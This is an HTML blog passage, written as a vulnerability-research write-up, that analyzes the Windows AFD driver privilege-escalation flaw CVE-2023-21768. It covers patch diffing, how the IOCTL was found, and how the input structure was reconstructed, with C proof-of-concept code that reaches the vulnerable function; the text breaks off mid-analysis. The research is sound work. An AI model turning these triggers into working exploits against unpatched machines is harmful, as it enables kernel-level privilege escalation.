@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Exploring Exploitation Methodologies for CVE-2023-21768 AFD for WinSock Elevation of Privilege - Logic Security</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="Exploiting CVE-2023-21768 AFD for WinSock Elevation of Privilege">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CPJWE5ZVG9"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CPJWE5ZVG9', { 'anonymize_ip': false });
+}
+</script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Logic Security" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/blog_img.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Logic Security</div>
+					
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/history_posts/">
+				
+				<span class="menu__text">Collection of Historical Posts</span>
+				
+			</a>
+		</li>
+		
+		
+		
+			
+				<li class="menu__item menu__item--active">
+					<a class="menu__link" href="/posts/cve_2023_21768/">
+						<span class="menu__text" style="font-weight: bold;">English</span>
+					</a>
+				</li>
+			
+				<li class="menu__item">
+					<a class="menu__link" href="/zh/posts/cve_2023_21768/">
+						<span class="menu__text" style="">中文</span>
+					</a>
+				</li>
+			
+		
+	</ul>
+</nav>
+
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Exploring Exploitation Methodologies for CVE-2023-21768 AFD for WinSock Elevation of Privilege</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">zoemurmure</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2023-04-21T09:52:44&#43;08:00">April 21, 2023</time></div>
+
+
+    <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+    
+        <span class="post-date">4554 words</span>, <span class="more-meta">22 min read</span>
+    
+
+<div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/vulnerability-analysis/" rel="category">Vulnerability Analysis</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<h2 id="1-preface">1. Preface</h2>
+<p>This article analyzes the CVE-2023-21768 vulnerability, which resides in the AFD (Ancillary Function Driver) driver of the Windows operating system. Throughout this post, &ldquo;the original article&rdquo; refers to reference [1]. By studying that article, I reproduced and rewrote the exploit code while analyzing my own shortcomings relative to the steps taken by others when developing exploits.</p>
+<p>This write-up covers three main sections: basic vulnerability analysis, vulnerability trigger attempts (PoC), and exploit implementation, along with a brief introduction to the I/O Ring concepts involved in the exploitation process.</p>
+<h2 id="2-patch-analysis">2. Patch Analysis</h2>
+<p>By comparing the patched and unpatched files (patch diffing), the patch was identified in the <code>AfdNotifyRemoveIoCompletion</code> function. The fix adds a check to verify whether a specific struct field is writable before performing the assignment operation:</p>
+<p><img src="/img/2023-03-27-16-59-36.png" alt=""></p>
+<p>In other words, before the patch, this field could be controlled by an attacker, allowing an arbitrary write to other locations.</p>
+<blockquote>
+<p>The author of the original article began with patch diffing, which is a standard procedure in Windows vulnerability analysis and would also be my first step if no other information were available. Diffing typically identifies the location of the patched function and provides initial clues about the vulnerability.</p>
+<p>After comparing the <code>afd.sys</code> file before and after the patch, it turned out that only one function had minor modifications. This is quite fortunate, as one often encounters multiple modified functions with substantial changes, making it difficult to pinpoint the vulnerability without additional information.</p>
+</blockquote>
+<h2 id="3-cross-reference-examination">3. Cross-Reference Examination</h2>
+<p>Based on the conclusion of the previous section, the attacker-controlled field <code>a3 + 24</code> belongs to the third parameter of <code>AfdNotifyRemoveIoCompletion</code>, meaning that this third parameter points to an unknown structure.</p>
+<p>Next, we check the cross-references of <code>AfdNotifyRemoveIoCompletion</code> to trace the origin of this parameter:</p>
+<pre tabindex="0"><code>.rdata:00000001C004D658                        dq offset AfdNotifySock
+.rdata:00000001C004D660     AfdIrpCallDispatch dq offset AfdBind
+→ AfdNotifySock(__int64 a1, __int64 a2, KPROCESSOR_MODE a3, ULONG64 a4, int a5, __int64 a6, int a7)
+→ AfdNotifyRemoveIoCompletion(a3, v1, a4)
+</code></pre><p>This indicates that the third parameter of <code>AfdNotifyRemoveIoCompletion</code> is the fourth parameter of <code>AfdNotifySock</code>, and <code>AfdNotifySock</code> is defined just above <code>AfdIrpCallDispatch</code>.</p>
+<p><img src="/img/2023-03-30-16-00-20.png" alt=""></p>
+<p>Looking at the image, it is intuitive to trace upwards. It appears <code>AfdNotifySock</code> should also reside in a function array, which leads us to another dispatch table: <code>AfdImmediateCallDispatch</code>.</p>
+<p>By checking the cross-references of <code>AfdImmediateCallDispatch</code>, we confirm that this function can be invoked via <code>DeviceIoControl</code>, and its control code (IOCTL) is stored in <code>AfdIoctlTable</code>:</p>
+<p><img src="/img/2023-03-30-16-02-55.png" alt=""></p>
+<p>By calculating the offset of <code>AfdNotifySock</code> within <code>AfdImmediateCallDispatch</code>, we find it is the 73rd element. Locating the 73rd element in <code>AfdIoctlTable</code> yields the IOCTL code for <code>AfdNotifySock</code>, which is <code>0x12127</code>.</p>
+<p>At this point, I would attempt to trigger the vulnerable function by calling <code>AfdNotifySock</code> via <code>DeviceIoControl</code>.</p>
+<blockquote>
+<p>Cross-reference checking is a logical next step to explore the function&rsquo;s purpose. From the steps above, the vulnerability is relatively straightforward to analyze since the call chain is very short and we quickly identify the dispatch table.</p>
+<p>The author of the original article leveraged materials from Steven Vittitoe&rsquo;s Recon presentation to confirm that AFD has two dispatch tables, the second being <code>AfdImmediateCallDispatch</code>. This indicates that during the analysis, the author also searched for and referenced a significant amount of AFD-related material.</p>
+<p>Once the dispatch table was found, I might not have been able to calculate the IOCTL code so quickly. Although I understand the underlying concepts, I am not yet proficient with this specific procedure. In a similar scenario, I would likely spend some time exploring, looking for <code>DeviceIoControl</code> code examples, and then figuring out how to determine the IOCTL code.</p>
+<p>In addition to the above, the original author noted that because the 73rd element is the last entry in the dispatch table, <code>AfdNotifySock</code> was likely added to the AFD driver&rsquo;s dispatch functions recently. This is a detail I would not have considered.</p>
+</blockquote>
+<h2 id="4-vulnerable-function-invocation-attempts">4. Vulnerable Function Invocation Attempts</h2>
+<p>The following steps represent my independent analysis, reflecting my own flow of thought and logic. However, since I had already read the original article beforehand, I cannot be certain if the analysis would have proceeded this smoothly without it.</p>
+<h3 id="41-parameter-1-hdevice">4.1 Parameter 1: hDevice</h3>
+<p>The prototype of <code>DeviceIoControl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">DeviceIoControl</span>(
+</span></span><span style="display:flex;"><span>  [in]                HANDLE       hDevice,
+</span></span><span style="display:flex;"><span>  [in]                DWORD        dwIoControlCode,
+</span></span><span style="display:flex;"><span>  [in, optional]      LPVOID       lpInBuffer,
+</span></span><span style="display:flex;"><span>  [in]                DWORD        nInBufferSize,
+</span></span><span style="display:flex;"><span>  [out, optional]     LPVOID       lpOutBuffer,
+</span></span><span style="display:flex;"><span>  [in]                DWORD        nOutBufferSize,
+</span></span><span style="display:flex;"><span>  [out, optional]     LPDWORD      lpBytesReturned,
+</span></span><span style="display:flex;"><span>  [in, out, optional] LPOVERLAPPED lpOverlapped
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>According to the prototype definition, we need a device handle. Initially, I was a bit lost regarding the device name. However, I found the following code online:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;WS2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    DWORD targetSize<span style="color:#f92672">=</span><span style="color:#ae81ff">0x310</span>;
+</span></span><span style="display:flex;"><span>    DWORD virtualAddress<span style="color:#f92672">=</span><span style="color:#ae81ff">0x13371337</span>;
+</span></span><span style="display:flex;"><span>    DWORD mdlSize<span style="color:#f92672">=</span>(<span style="color:#ae81ff">0x4000</span><span style="color:#f92672">*</span>(targetSize<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0xFFF0</span><span style="color:#f92672">-</span>(virtualAddress<span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> DWORD inbuf1[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>    memset(inbuf1,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(inbuf1));
+</span></span><span style="display:flex;"><span>    inbuf1[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">=</span>virtualAddress;
+</span></span><span style="display:flex;"><span>    inbuf1[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">=</span>mdlSize;
+</span></span><span style="display:flex;"><span>    inbuf1[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> DWORD inbuf2[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>    memset(inbuf2,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(inbuf2));
+</span></span><span style="display:flex;"><span>    inbuf2[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    inbuf2[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0AAAAAAA</span>;
+</span></span><span style="display:flex;"><span>    WSADATA WSAData;
+</span></span><span style="display:flex;"><span>    SOCKET s;
+</span></span><span style="display:flex;"><span>    sockaddr_in sa;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ierr;
+</span></span><span style="display:flex;"><span>    WSAStartup(<span style="color:#ae81ff">0x2</span>,<span style="color:#f92672">&amp;</span>WSAData);
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>sa,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    sa.sin_port<span style="color:#f92672">=</span>htons(<span style="color:#ae81ff">135</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_addr.S_un.S_addr<span style="color:#f92672">=</span>inet_addr(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_family<span style="color:#f92672">=</span>AF_INET;
+</span></span><span style="display:flex;"><span>    ierr<span style="color:#f92672">=</span>connect(s,(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sa,<span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> outBuf[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>    DWORD bytesRet;
+</span></span><span style="display:flex;"><span>    DeviceIoControl((HANDLE)s,<span style="color:#ae81ff">0X1207F</span>,(LPVOID)inbuf1,<span style="color:#ae81ff">0x30</span>,outBuf,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>bytesRet,NULL);
+</span></span><span style="display:flex;"><span>    DeviceIoControl((HANDLE)s,<span style="color:#ae81ff">0X120C3</span>,(LPVOID)inbuf2,<span style="color:#ae81ff">0x18</span>,outBuf,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>bytesRet,NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It appears we can pass a socket as the handle. Although I wasn&rsquo;t certain if it was correct, it was worth trying.</p>
+<h3 id="42-parameter-2-lpinbuffer">4.2 Parameter 2: lpInBuffer</h3>
+<p>In addition to the device handle, we need to determine the contents of <code>lpInBuffer</code>. I was unsure if Windows drivers&rsquo; dispatch routines have fixed structures or standard methods for defining input buffers, and search queries yielded no results. However, I found a function call to <code>AfdFastIoDeviceControl</code>, from which we can infer the prototype. This function is where the cross-references to <code>AfdImmediateCallDispatch</code> appear.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">AfdFastIoDeviceControl</span>(
+</span></span><span style="display:flex;"><span>           FileObject,
+</span></span><span style="display:flex;"><span>           Wait,
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">&amp;</span>sendInfo,
+</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">sizeof</span>(sendInfo),
+</span></span><span style="display:flex;"><span>           NULL,
+</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>           IOCTL_AFD_SEND,
+</span></span><span style="display:flex;"><span>           IoStatus,
+</span></span><span style="display:flex;"><span>           DeviceObject
+</span></span><span style="display:flex;"><span>           );
+</span></span></code></pre></div><p>Based on this, I located the code at the cross-reference of <code>AfdFastIoDeviceControl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span> idx <span style="color:#f92672">=</span> (ioctlCode <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3FF</span>;
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">74</span> <span style="color:#f92672">&amp;&amp;</span> AfdIoctlTable[idx] <span style="color:#f92672">==</span> ioctlCode )
+</span></span><span style="display:flex;"><span> {
+</span></span><span style="display:flex;"><span>   func <span style="color:#f92672">=</span> AfdImmediateCallDispatch[idx];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ( func )
+</span></span><span style="display:flex;"><span>   {
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">*</span>v96 <span style="color:#f92672">=</span> func(
+</span></span><span style="display:flex;"><span>              FileObject,
+</span></span><span style="display:flex;"><span>              ioctlCode,
+</span></span><span style="display:flex;"><span>              mode,
+</span></span><span style="display:flex;"><span>              inputBuffer,
+</span></span><span style="display:flex;"><span>              inputBufferLength,
+</span></span><span style="display:flex;"><span>              outputBuffer_1,
+</span></span><span style="display:flex;"><span>              outputBufferLength,
+</span></span><span style="display:flex;"><span>              v96 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>     LOBYTE(v12) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">goto</span> LABEL_58;
+</span></span></code></pre></div><p>Therefore, the fourth parameter of <code>AfdNotifySock</code>—which, as mentioned earlier, resides in the struct containing the attacker-controlled field—is the driver&rsquo;s input buffer. Since this structure is currently unknown to us, we will adopt the name <code>AFD_NOTIFYSOCK_STRUCT</code> from the original article.</p>
+<h3 id="43-other-parameters">4.3 Other Parameters</h3>
+<p>By renaming the parameters of <code>AfdNotifySock</code> in IDA based on our findings, the requirements for the other parameters become apparent:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">AfdNotifySock</span>(<span style="color:#66d9ef">__int64</span> FileObject, <span style="color:#66d9ef">__int64</span> ioctlCode, KPROCESSOR_MODE mode, ULONG64 inputBuffer, <span style="color:#66d9ef">int</span> inputBufferLength, <span style="color:#66d9ef">__int64</span> outputBuffer, <span style="color:#66d9ef">int</span> outputBufferLength)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&#34;+&#34; TO EXPAND]  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    AfdNotifyStruct <span style="color:#f92672">=</span> inputBuffer;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( inputBufferLength <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x30</span> <span style="color:#f92672">||</span> outputBufferLength )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC0000004</span>;                        <span style="color:#75715e">// STATUS_INFO_LENGTH_MISMATCH
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">goto</span> rtn1;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( outputBuffer )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> rtn2;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This shows that the unknown <code>AFD_NOTIFYSOCK_STRUCT</code> must be 48 bytes in size, the output buffer must be null, and the output buffer size must be 0.</p>
+<p>The remaining parameters are optional and can be left blank.</p>
+<p>At this point, we have established how to invoke <code>AfdNotifySock</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;WS2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    BYTE inbuf1[<span style="color:#ae81ff">48</span>];
+</span></span><span style="display:flex;"><span>    memset(inbuf1, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(inbuf1));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WSADATA WSAData;
+</span></span><span style="display:flex;"><span>    SOCKET s;
+</span></span><span style="display:flex;"><span>    sockaddr_in sa;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ierr;
+</span></span><span style="display:flex;"><span>    WSAStartup(<span style="color:#ae81ff">0x2</span>, <span style="color:#f92672">&amp;</span>WSAData);
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>sa, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    sa.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">135</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    ierr <span style="color:#f92672">=</span> connect(s, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sa, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> outBuf[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>    DWORD bytesRet;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DeviceIoControl((HANDLE)s, <span style="color:#ae81ff">0X12127</span>, (LPVOID)inbuf1, <span style="color:#66d9ef">sizeof</span>(inbuf1), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="5-vulnerability-path-exploration">5. Vulnerability Path Exploration</h2>
+<p>By setting a breakpoint at <code>afd!AfdNotifySock</code> and executing the compiled binary, we successfully break at <code>AfdNotifySock</code>. Next, using a combination of static analysis and dynamic debugging, we determine how to construct the <code>AFD_NOTIFYSOCK_STRUCT</code> to reach the vulnerability trigger point: <code>AfdNotifySock -&gt; AfdNotifyRemoveIoCompletion -&gt; **(a3+24)=v20</code>.</p>
+<h3 id="51-initial-attempts">5.1 Initial Attempts</h3>
+<p>Inside <code>AfdNotifySock</code>, we locate the following logic:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>((_DWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) )       <span style="color:#75715e">//  AfdNotifyStruct  + 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">goto</span> rtn2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) )      <span style="color:#75715e">//  AfdNotifyStruct  + 0x28
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//  AfdNotifyStruct  + 0x18         //  AfdNotifyStruct  + 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>((_QWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!*</span>((_QWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> rtn2;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//  AfdNotifyStruct  + 0x10       //  AfdNotifyStruct  + 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>rtn2:
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xC000000D</span>;                        <span style="color:#75715e">// STATUS_INVALID_PARAMETER
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">goto</span> rtn1;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>From this code snippet, we can initially infer the structure of <code>AFD_NOTIFYSOCK_STRUCT</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> {
+</span></span><span style="display:flex;"><span>    UNKNOWNTYPE     UNKNOWN;     <span style="color:#75715e">// 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       DATA1;       <span style="color:#75715e">// 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       CONTROLDATA; <span style="color:#75715e">// 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD           DATA2;       <span style="color:#75715e">// 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD           DATA3;       <span style="color:#75715e">// 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       DATA4;       <span style="color:#75715e">// 0x28
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>The conditions to proceed are:</p>
+<ol>
+<li><strong><code>DATA2</code> must not be 0</strong>;</li>
+<li>If <code>DATA4</code> is 0, both <code>DATA1</code> and <code>DATA3</code> must be 0;</li>
+<li><strong>If <code>DATA4</code> is not 0, both <code>DATA1</code> and <code>CONTROLDATA</code> must not be 0</strong>.</li>
+</ol>
+<p>Since <code>CONTROLDATA</code> is the field the attacker wants to control, it cannot be 0. Thus, to hit the vulnerability path, the fields in <code>AFD_NOTIFYSOCK_STRUCT</code> must satisfy conditions (1) and (3).</p>
+<p>Next, we encounter the following code blocks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>  v11 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_OBJECT_TYPE</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>IoCompletionObjectType;
+</span></span><span style="display:flex;"><span>  firstItem <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)AfdNotifyStruct;        <span style="color:#75715e">//  AfdNotifyStruct + 0x00
